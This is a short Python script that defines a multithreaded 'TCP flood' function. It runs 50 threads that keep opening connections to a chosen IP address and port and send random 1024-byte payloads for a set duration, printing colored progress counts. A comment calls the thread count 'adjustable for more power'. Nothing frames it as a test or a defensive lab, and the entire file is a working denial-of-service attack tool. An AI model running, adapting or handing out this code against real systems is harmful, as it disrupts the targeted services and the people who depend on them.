import socket
import threading
import random
import time
from colorama import Fore, Style

def tcp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    sent = 0

    def attack():
        nonlocal sent
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                payload = random._urandom(1024)
                s.send(payload)
                s.close()
                sent += 1
                print(f"{Fore.RED}[TCP] Sent packet #{sent} to {target_ip}:{target_port}{Style.RESET_ALL}")
            except Exception:
                pass

    thread_count = 50  # Adjustable for more power
    threads = []

    print(f"\n{Fore.CYAN}[*] Starting TCP Flood on {target_ip}:{target_port} for {duration}s...{Style.RESET_ALL}")
    for _ in range(thread_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"{Fore.GREEN}[+] TCP Flood Completed. Packets sent: {sent}{Style.RESET_ALL}")
